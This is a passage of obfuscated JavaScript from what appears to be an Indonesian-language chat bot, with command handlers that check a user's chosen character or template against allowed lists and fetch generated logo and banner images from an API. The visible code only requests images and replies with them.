_0x70b548(_0x240d04(0x2854)+'hanya\x20untu'+'k\x20owner!');_0x506898(_0x1ce978[_0x240d04(0x18ff)])[_0x240d04(0xefe)](()=>{const _0x48b11d=_0x240d04;_0x417e73[_0x48b11d(0x1aaa)]();});}}}break;case _0x1ce978[_0x240d04(0x156a)]:{if(_0x1ce978[_0x240d04(0x11b)](_0x240d04(0x2b76),_0x1ce978[_0x240d04(0x770)]))return _0x50ab69(_0x1ce978[_0x240d04(0x17c4)]);else{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x275c)](_0x476bfb,'Kirim\x20peri'+'ntah:\x0a`'+(_0x1ec495+_0x3e6565)+(_0x240d04(0x2769)+_0x240d04(0x1685)+_0x240d04(0x1d12)+'an:\x0a`')+_0x1ce978[_0x240d04(0xdba)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x19f2)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978['wYVEd'](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x2a74)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2769)+_0x240d04(0x1685)+_0x240d04(0x1d12)+_0x240d04(0x2ee2))+_0x1ce978[_0x240d04(0x1360)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x19f2)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x3da59b=['zyra',_0x1ce978['JmsBF'],_0x1ce978[_0x240d04(0x2cd8)],_0x1ce978[_0x240d04(0x2e90)],_0x1ce978[_0x240d04(0x10b5)],_0x1ce978[_0x240d04(0x2a6)],_0x1ce978[_0x240d04(0x53a)],_0x240d04(0xf87),_0x1ce978[_0x240d04(0xf77)],_0x1ce978[_0x240d04(0x1eec)],_0x1ce978[_0x240d04(0x65d)],'warwick','volibear',_0x1ce978[_0x240d04(0x239a)],_0x1ce978[_0x240d04(0x2e52)],'vi',_0x1ce978[_0x240d04(0x176b)],_0x1ce978[_0x240d04(0x1c99)],_0x1ce978['sIdBt'],_0x1ce978[_0x240d04(0xffc)],_0x1ce978['Olgpl'],_0x1ce978['lPtOg'],_0x1ce978[_0x240d04(0x29d3)],_0x1ce978[_0x240d04(0x2b7a)],_0x240d04(0x793),_0x1ce978[_0x240d04(0x1d54)],_0x1ce978[_0x240d04(0x1def)],_0x1ce978[_0x240d04(0x1f78)],_0x1ce978['WcMmV'],_0x240d04(0x11a5),_0x1ce978[_0x240d04(0x613)],_0x1ce978[_0x240d04(0x83b)],_0x1ce978[_0x240d04(0x116)],_0x240d04(0x2a33),_0x1ce978['iAZSy'],_0x240d04(0x18c7),_0x1ce978[_0x240d04(0x2269)],_0x240d04(0x596),_0x240d04(0x807),_0x1ce978[_0x240d04(0x1afc)],'singed',_0x1ce978[_0x240d04(0x1ecb)],'shen',_0x240d04(0x20c0),_0x1ce978[_0x240d04(0x662)],_0x1ce978[_0x240d04(0xd5d)],_0x240d04(0x1456),'riven',_0x1ce978[_0x240d04(0x1146)],_0x1ce978['XibAt'],_0x1ce978[_0x240d04(0x136e)],_0x1ce978[_0x240d04(0x2365)],_0x1ce978[_0x240d04(0x1315)],'quinn',_0x1ce978[_0x240d04(0x2964)],_0x1ce978['RaxXP'],_0x240d04(0x1984),'olaf',_0x1ce978[_0x240d04(0x2380)],_0x1ce978['dwiJa'],_0x1ce978[_0x240d04(0x1644)],_0x1ce978['vDdAG'],'nalphite',_0x1ce978['lqGDx'],_0x240d04(0x2045),_0x1ce978[_0x240d04(0x62d)],_0x1ce978['FpuMD'],_0x1ce978[_0x240d04(0x1d3)],_0x1ce978[_0x240d04(0x2c3)],_0x1ce978[_0x240d04(0x232d)],_0x1ce978[_0x240d04(0x2274)],_0x1ce978[_0x240d04(0x280a)],_0x1ce978[_0x240d04(0x1419)],_0x1ce978['XzzLz'],_0x1ce978[_0x240d04(0x74b)],_0x240d04(0x695),_0x1ce978[_0x240d04(0x1bfe)],_0x1ce978[_0x240d04(0x1a6d)],_0x1ce978[_0x240d04(0x348)],_0x1ce978[_0x240d04(0x2507)],_0x1ce978[_0x240d04(0x1d35)],_0x1ce978['ZNXHv'],_0x1ce978[_0x240d04(0x3b2)],_0x240d04(0x2d8f),_0x1ce978[_0x240d04(0xe7)],_0x1ce978[_0x240d04(0x1a40)],_0x1ce978['RQEvl'],_0x1ce978['tklMN'],_0x1ce978[_0x240d04(0x3cb)],_0x1ce978[_0x240d04(0x24a4)],_0x240d04(0x1f87),_0x240d04(0xc04),_0x1ce978[_0x240d04(0x1f13)],_0x1ce978[_0x240d04(0x17c2)],_0x1ce978[_0x240d04(0x2764)],_0x1ce978[_0x240d04(0x2c1f)],_0x240d04(0x2de),_0x1ce978[_0x240d04(0x1854)],_0x240d04(0x8e8),'heimerding'+'er',_0x240d04(0x7de),_0x1ce978['LSQAQ'],_0x1ce978['ubXvG'],_0x1ce978['SDJFd'],_0x1ce978[_0x240d04(0xe0b)],_0x1ce978[_0x240d04(0x435)],'galio',_0x1ce978['BaiCS'],_0x1ce978['IvtJH'],_0x1ce978[_0x240d04(0x2c23)],_0x1ce978['kbJkr'],_0x1ce978[_0x240d04(0x28f7)],_0x1ce978[_0x240d04(0x18a3)],_0x1ce978[_0x240d04(0x2dce)],_0x240d04(0x299c),_0x1ce978[_0x240d04(0x1023)],_0x1ce978[_0x240d04(0xaf4)],_0x1ce978[_0x240d04(0x2a9f)],_0x240d04(0x2ab0),'chogath',_0x1ce978['blgjd'],'camille',_0x1ce978[_0x240d04(0x1ae1)],_0x1ce978['JPome'],_0x1ce978[_0x240d04(0x2bb9)],_0x1ce978[_0x240d04(0x1b4c)],_0x1ce978['HyPrZ'],_0x1ce978[_0x240d04(0xba3)],_0x240d04(0xc32)+'l',_0x240d04(0x295),_0x240d04(0x14e4),_0x1ce978[_0x240d04(0x10da)],'amumu',_0x1ce978[_0x240d04(0x2e14)],_0x1ce978[_0x240d04(0x138c)],_0x1ce978[_0x240d04(0x13e6)],_0x240d04(0x24ce),_0x1ce978['WtmAt'],_0x1ce978[_0x240d04(0x13c0)],_0x240d04(0xacc),_0x1ce978[_0x240d04(0x2b31)],_0x1ce978[_0x240d04(0x1e0)],_0x240d04(0x1b79),_0x1ce978[_0x240d04(0xeb0)],_0x1ce978[_0x240d04(0x1960)],_0x1ce978['SqtsU'],'evelynn-2',_0x1ce978[_0x240d04(0x776)]];if(!_0x3da59b[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978['IpUHu'](_0x555a99,_0x3da59b,_0x3da59b[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x8ca)]);else{_0x476bfb(lang[_0x240d04(0x172a)]);let _0x1eae96=_0x1ce978[_0x240d04(0x27c1)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978['IgAUl'](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'avatar':_0x83dd4c},_0x1ce978['EEoOe']),_0x178529=await _0x1ce978[_0x240d04(0xf56)](fetch,_0x1eae96);if(!_0x178529['ok'])throw await _0x178529['text']();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x1eae96},{'caption':lang['ok']});}}}break;case _0x1ce978[_0x240d04(0x1e7c)]:{if(_0x1ce978[_0x240d04(0x2116)](_0x1ce978['XCztS'],_0x240d04(0x2c4a)))_0x38d163(_0x245765,_0x44ed1b[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2597)]);else{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x27d4)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+('\x20teks|char'+_0x240d04(0x1a3f)+_0x240d04(0x1f79)+_0x240d04(0x2a75))+_0x1ce978[_0x240d04(0x18ef)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'1`'));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0xca9)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x182c)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1860)+_0x240d04(0x1a3f)+'ntoh\x20pengg'+_0x240d04(0x2a75))+_0x1ce978[_0x240d04(0x2c22)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'1`'));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x541f95=['1','2','3','4','5','6','7','8','9','10','11','12'];if(!_0x541f95[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978['sWQuX'](_0x555a99,_0x541f95,_0x541f95['length'],_0x1ce978[_0x240d04(0x2597)]);else{_0x1ce978['NZnvg'](_0x476bfb,lang['wait']);let _0x2a912e=_0x1ce978['WJhoB'](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x1462)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'character':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x350fc9=await fetch(_0x2a912e);if(!_0x350fc9['ok'])throw await _0x350fc9[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x2a912e},{'caption':lang['ok']});}}}break;case _0x1ce978[_0x240d04(0xff9)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0xa28)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x1860)+_0x240d04(0x1a3f)+_0x240d04(0x1f79)+_0x240d04(0x2a75))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x2861)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x476bfb('Kirim\x20peri'+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x29ce)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1860)+_0x240d04(0x1a3f)+_0x240d04(0x1f79)+_0x240d04(0x2a75))+_0x1ce978[_0x240d04(0x1696)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x2861)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x16a4db=[_0x1ce978[_0x240d04(0x58f)],_0x1ce978[_0x240d04(0x6f1)],_0x1ce978[_0x240d04(0x7ec)],_0x1ce978[_0x240d04(0x113d)],_0x1ce978[_0x240d04(0xbdb)],_0x1ce978[_0x240d04(0x2544)],_0x1ce978[_0x240d04(0x27ca)],_0x1ce978[_0x240d04(0xe9b)],_0x240d04(0x25b3),_0x240d04(0x264a),_0x1ce978[_0x240d04(0xe4)],_0x1ce978[_0x240d04(0x55f)],_0x1ce978[_0x240d04(0x1cb7)],_0x1ce978['jDXxA'],_0x1ce978[_0x240d04(0x2d96)],_0x1ce978[_0x240d04(0x27b6)],_0x1ce978[_0x240d04(0x222d)],_0x1ce978['CHZzx'],_0x1ce978[_0x240d04(0x3f9)],_0x1ce978['BSkRp'],_0x1ce978['lVuns'],_0x1ce978[_0x240d04(0xbcb)]];if(!_0x16a4db['includes'](_0x83dd4c)){if(_0x1ce978[_0x240d04(0x178f)](_0x1ce978['vCWTG'],_0x240d04(0x1b26)))return _0x1ce978[_0x240d04(0x6b8)](_0x27d592,_0x1ce978['iOIVV']);else _0x555a99(_0x16a4db,_0x16a4db[_0x240d04(0x2b45)],_0x240d04(0xc53));}else{_0x1ce978[_0x240d04(0x251a)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x2c3254=api(_0x1ce978[_0x240d04(0x44a)],_0x1ce978['TtxmZ'](_0x1ce978['jrCNG'],_0x3e6565),{'text':_0x2b7b14,'character':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x3b709a=await _0x1ce978[_0x240d04(0x1cfa)](fetch,_0x2c3254);if(!_0x3b709a['ok'])throw await _0x3b709a['text']();_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x2c3254},{'caption':lang['ok']});}}break;case _0x1ce978['ieXrx']:{if(!_0x33cfb1)return _0x1ce978['nWjsT'](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x2395)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1192)+_0x240d04(0x2e9f)+_0x240d04(0x2890)+'n:\x0a`')+_0x1ce978[_0x240d04(0x1463)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x13bf)));if(!_0x33cfb1['includes']('|'))return _0x476bfb('Kirim\x20peri'+'ntah:\x0a`'+_0x1ce978['lZJxt'](_0x1ec495,_0x3e6565)+(_0x240d04(0x1192)+'e`\x0a\x0aContoh'+_0x240d04(0x2890)+_0x240d04(0x2df2))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x13bf)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c['split']('|')[0x1];const _0x3aaff8=[_0x1ce978[_0x240d04(0x15d6)],_0x240d04(0xe89),_0x240d04(0x2879),_0x1ce978[_0x240d04(0x2f3)],_0x240d04(0x1c5),_0x1ce978[_0x240d04(0x1143)],_0x1ce978['EVgNd'],_0x240d04(0x1d29),_0x1ce978[_0x240d04(0x2b26)],'shark',_0x1ce978[_0x240d04(0x98e)],_0x1ce978['tFgSf'],_0x1ce978[_0x240d04(0x104)],_0x1ce978[_0x240d04(0x114c)],_0x1ce978['rgVDP'],_0x1ce978[_0x240d04(0x263e)],_0x1ce978[_0x240d04(0x12d4)],_0x1ce978[_0x240d04(0x28fa)]];if(!_0x3aaff8[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0x14ae)](_0x555a99,_0x3aaff8,_0x3aaff8[_0x240d04(0x2b45)],_0x240d04(0x26c2));else{_0x1ce978['LaHOS'](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x40e88e=_0x1ce978['aaMxs'](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x23b5)](_0x240d04(0x1dfb)+_0x240d04(0x1d21),_0x3e6565),{'text':_0x2b7b14,'style':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x480fd9=await _0x1ce978[_0x240d04(0x1e16)](fetch,_0x40e88e);if(!_0x480fd9['ok'])throw await _0x480fd9['text']();_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x40e88e},{'caption':lang['ok']});}}break;case _0x240d04(0x2e0c)+_0x240d04(0x1b61):{if(!_0x33cfb1)return _0x1ce978['cqBXb'](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1561)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1860)+_0x240d04(0x1a3f)+_0x240d04(0x1f79)+'unaan:\x0a`')+_0x1ce978[_0x240d04(0x2a59)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x25e5)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978['yxhEu'](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978['zQGOk'](_0x1ec495,_0x3e6565)+(_0x240d04(0x1860)+'acter`\x0a\x0aCo'+_0x240d04(0x1f79)+_0x240d04(0x2a75))+_0x1ce978[_0x240d04(0x755)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x25e5)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x108610=[_0x1ce978['RzQJc'],_0x1ce978[_0x240d04(0x580)],_0x1ce978[_0x240d04(0x2fa)],_0x1ce978[_0x240d04(0x22f1)],_0x1ce978[_0x240d04(0x1787)],_0x1ce978[_0x240d04(0x1d97)],_0x1ce978['kczfL'],_0x240d04(0xee),_0x1ce978[_0x240d04(0x19e6)],_0x240d04(0x21a1),_0x1ce978['SRiQH'],_0x1ce978[_0x240d04(0x179a)],'sabo',_0x1ce978[_0x240d04(0x1dce)],_0x240d04(0x247b),_0x1ce978[_0x240d04(0xe94)],_0x240d04(0x280c),_0x1ce978[_0x240d04(0x11f1)]];if(!_0x108610['includes'](_0x83dd4c))_0x555a99(_0x108610,_0x108610[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2597)]);else{_0x1ce978[_0x240d04(0x180a)](_0x476bfb,lang['wait']);let _0x4a78c1=_0x1ce978['fGhjL'](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x22a7)](_0x240d04(0x1dfb)+_0x240d04(0x1d21),_0x3e6565),{'text':_0x2b7b14,'character':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x266f13=await _0x1ce978[_0x240d04(0x1fb2)](fetch,_0x4a78c1);if(!_0x266f13['ok'])throw await _0x266f13[_0x240d04(0x1d8c)]();_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x4a78c1},{'caption':lang['ok']});}}break;case _0x240d04(0x2b86)+'go':{if(!_0x33cfb1)return _0x476bfb(_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978['jDrne'](_0x1ec495,_0x3e6565)+(_0x240d04(0x1435)+_0x240d04(0x2874)+_0x240d04(0x2b1d)+_0x240d04(0x185a))+_0x1ce978[_0x240d04(0x296a)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x17c1)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x1d4b)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x1435)+'late`\x0a\x0aCon'+_0x240d04(0x2b1d)+_0x240d04(0x185a))+_0x1ce978[_0x240d04(0x1df)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'banner-7`'));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x3d86a4=[_0x1ce978[_0x240d04(0xfd4)],_0x1ce978[_0x240d04(0xc15)],'banner-3',_0x1ce978['YbsXg'],_0x1ce978['rwFjD'],_0x1ce978[_0x240d04(0x2c44)],_0x1ce978[_0x240d04(0x2097)]];if(!_0x3d86a4[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0x1375)](_0x555a99,_0x3d86a4,_0x3d86a4[_0x240d04(0x2b45)],_0x240d04(0x232b));else{_0x1ce978[_0x240d04(0x40f)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x18766d=_0x1ce978[_0x240d04(0xa94)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x284e)]+_0x3e6565,{'text':_0x2b7b14,'banner':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x1eb414=await fetch(_0x18766d);if(!_0x1eb414['ok'])throw await _0x1eb414[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x18766d},{'caption':lang['ok']});}}break;case _0x1ce978[_0x240d04(0x2104)]:{if(_0x1ce978[_0x240d04(0xa54)](_0x1ce978[_0x240d04(0x28d4)],_0x1ce978['GaEqf'])){if(!_0x33cfb1)return _0x1ce978['DuREW'](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x18ed)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1435)+'late`\x0a\x0aCon'+_0x240d04(0x2b1d)+_0x240d04(0x185a))+_0x1ce978[_0x240d04(0x1ca)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xd62)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x15e5)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+('\x20teks|temp'+_0x240d04(0x2874)+_0x240d04(0x2b1d)+_0x240d04(0x185a))+_0x1ce978[_0x240d04(0x2144)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xd62)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x1073c4=[_0x1ce978['SiiUz'],_0x240d04(0x15b7),_0x1ce978[_0x240d04(0xb46)],_0x240d04(0x1d8),_0x1ce978['IZjxe'],_0x1ce978[_0x240d04(0x2d17)],_0x1ce978[_0x240d04(0x76b)],_0x1ce978[_0x240d04(0x90e)],_0x1ce978['rJhSx'],'cover-10',_0x1ce978['ZutGm'],_0x1ce978[_0x240d04(0x2060)]];if(!_0x1073c4['includes'](_0x83dd4c))_0x1ce978[_0x240d04(0x18cd)](_0x555a99,_0x1073c4,_0x1073c4[_0x240d04(0x2b45)],'template');else{_0x476bfb(lang[_0x240d04(0x172a)]);let _0x3a1a50=_0x1ce978['FxSWR'](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978['DLCmX'](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'template':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x5ef9f0=await _0x1ce978[_0x240d04(0x17d7)](fetch,_0x3a1a50);if(!_0x5ef9f0['ok'])throw await _0x5ef9f0[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+'hoto']({'url':_0x3a1a50},{'caption':lang['ok']});}}else _0xb8e6ab='*Gagal*\x20ko'+'rupsi\x20*ban'+'sos*\x20tapi\x20'+_0x240d04(0x2730)+_0x240d04(0x240e)+'ikan\x20diri*'+_0x240d04(0x306)+'ak\x20ditangk'+_0x240d04(0x19a8),_0x462a93='';}break;case _0x1ce978[_0x240d04(0x2a65)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x1a2c)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x8a0)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x26f7)+_0x240d04(0x2214)+_0x240d04(0x2070)+'\x0a`')+_0x1ce978[_0x240d04(0x1012)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'ofc|neeko`'));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x207b)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0xc08)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x26f7)+'\x0a\x0aContoh\x20p'+_0x240d04(0x2070)+'\x0a`')+_0x1ce978[_0x240d04(0x1c80)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x1598)));var _0x13a51f=_0x483c03['join']('\x20')[_0x240d04(0x1c39)]('|'),_0x2b7b14=_0x13a51f[0x0],_0x83dd4c=_0x13a51f[0x1],_0x345085=_0x13a51f[0x2];if(!_0x345085)return _0x1ce978[_0x240d04(0x2335)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978['YxAim'](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x26f7)+'\x0a\x0aContoh\x20p'+_0x240d04(0x2070)+'\x0a`')+_0x1ce978[_0x240d04(0x4c3)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x1598)));const _0x39ee92=[_0x1ce978[_0x240d04(0x1db6)],_0x1ce978[_0x240d04(0x11f3)],_0x1ce978[_0x240d04(0x763)],_0x1ce978[_0x240d04(0xe37)],_0x1ce978['ZCwLt'],_0x240d04(0x2eec)+'2',_0x1ce978[_0x240d04(0x22ed)],_0x1ce978[_0x240d04(0x1483)],_0x240d04(0x2471),_0x1ce978[_0x240d04(0x2d59)],_0x240d04(0x1f29),_0x1ce978[_0x240d04(0x159c)],_0x1ce978['wwjBD'],_0x1ce978[_0x240d04(0x10ba)],_0x1ce978[_0x240d04(0x1d3b)],_0x1ce978['xyWxn'],'quinn',_0x240d04(0x152a),_0x1ce978[_0x240d04(0x22ae)],_0x1ce978[_0x240d04(0x2a3f)],_0x240d04(0x193),'nordekaise'+'r',_0x1ce978[_0x240d04(0xdd5)],_0x1ce978['XibAt'],_0x1ce978[_0x240d04(0x1146)],_0x1ce978['fSVcT'],_0x240d04(0x28f8),'soraka','tristana',_0x1ce978[_0x240d04(0x19d4)],_0x1ce978['FFPXT'],_0x1ce978[_0x240d04(0x2cd8)],_0x1ce978[_0x240d04(0x1bfe)],_0x1ce978[_0x240d04(0x1493)],_0x1ce978['lqGDx'],_0x1ce978[_0x240d04(0x27a2)],_0x240d04(0x2bfb),_0x1ce978[_0x240d04(0x232d)],_0x1ce978[_0x240d04(0x2003)],'pyke',_0x1ce978[_0x240d04(0x1f60)],_0x1ce978[_0x240d04(0x1315)],_0x1ce978[_0x240d04(0x2deb)],_0x1ce978['PMVrh'],_0x1ce978[_0x240d04(0xe87)],_0x1ce978['vifvj'],_0x1ce978[_0x240d04(0x613)],_0x240d04(0xde7),_0x240d04(0x205d),_0x1ce978['iipnV'],_0x1ce978[_0x240d04(0xffc)],'vayne',_0x240d04(0x2b55),_0x1ce978[_0x240d04(0x239a)],_0x1ce978[_0x240d04(0x53a)],_0x1ce978[_0x240d04(0x2e90)],_0x1ce978[_0x240d04(0x27e1)],_0x1ce978[_0x240d04(0x11e3)],_0x1ce978['ouonS'],_0x240d04(0x8e8),'irelia',_0x1ce978[_0x240d04(0x272)],_0x1ce978[_0x240d04(0x2c1f)],_0x1ce978[_0x240d04(0x1fdf)],_0x1ce978[_0x240d04(0x17c2)],_0x1ce978['dXkle'],_0x1ce978['ddECS'],_0x240d04(0x1f87),_0x1ce978['SqtsU'],_0x1ce978[_0x240d04(0x24a4)],_0x240d04(0x2187),_0x240d04(0x131b),_0x1ce978[_0x240d04(0x24d5)],'katarina',_0x1ce978[_0x240d04(0xe7)],_0x1ce978[_0x240d04(0xf1e)],_0x1ce978[_0x240d04(0x3b2)],_0x240d04(0x2384),_0x1ce978['Njkdp'],_0x1ce978[_0x240d04(0x2507)],_0x240d04(0x262e),_0x240d04(0x24ce),_0x1ce978[_0x240d04(0x13e6)],_0x1ce978['DrPYk'],_0x1ce978[_0x240d04(0x2e14)],_0x1ce978[_0x240d04(0x2818)],_0x1ce978[_0x240d04(0x10da)],_0x1ce978[_0x240d04(0x200)],_0x1ce978[_0x240d04(0x23a0)],'aurelionso'+'l',_0x1ce978[_0x240d04(0xba3)],_0x1ce978[_0x240d04(0x1195)],'blitzcrank',_0x1ce978[_0x240d04(0x2bb9)],_0x1ce978[_0x240d04(0x41c)],_0x240d04(0x19b2),_0x1ce978[_0x240d04(0x22bd)],_0x240d04(0x23a1),_0x1ce978[_0x240d04(0x263a)],_0x1ce978[_0x240d04(0x291b)],_0x1ce978[_0x240d04(0x2a9f)],_0x240d04(0x968),_0x1ce978[_0x240d04(0x28f7)],_0x1ce978[_0x240d04(0x1023)],_0x1ce978[_0x240d04(0x2a78)],_0x1ce978['XsqEA'],_0x240d04(0x1b34),_0x1ce978[_0x240d04(0x28ca)],_0x1ce978['idqAj'],_0x1ce978[_0x240d04(0x1a06)],_0x1ce978[_0x240d04(0x1e3d)],_0x1ce978[_0x240d04(0x19ca)],_0x1ce978[_0x240d04(0x435)],_0x1ce978[_0x240d04(0xe0b)],_0x1ce978[_0x240d04(0x27c2)],'gragas',_0x1ce978[_0x240d04(0xf29)]];if(!_0x39ee92[_0x240d04(0x55c)](_0x345085))_0x1ce978[_0x240d04(0x142)](_0x555a99,_0x39ee92,_0x39ee92[_0x240d04(0x2b45)],_0x240d04(0x232b));else{_0x1ce978[_0x240d04(0x27ee)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x39b4eb=_0x1ce978[_0x240d04(0x2a7)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x2175)](_0x240d04(0x1dfb)+_0x240d04(0x1d21),_0x3e6565),{'text':_0x2b7b14,'text2':_0x83dd4c,'banner':_0x345085},_0x1ce978['EEoOe']),_0x1e67fa=await _0x1ce978[_0x240d04(0x289)](fetch,_0x39b4eb);if(!_0x1e67fa['ok'])throw await _0x1e67fa['text']();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x39b4eb},{'caption':lang['ok']});}}break;case _0x240d04(0x18a6)+'v2':{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x6a1)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+('\x20teks1|tek'+_0x240d04(0x26f7)+_0x240d04(0x2214)+'enggunaan:'+'\x0a`')+_0x1ce978[_0x240d04(0x134e)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x8af)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return 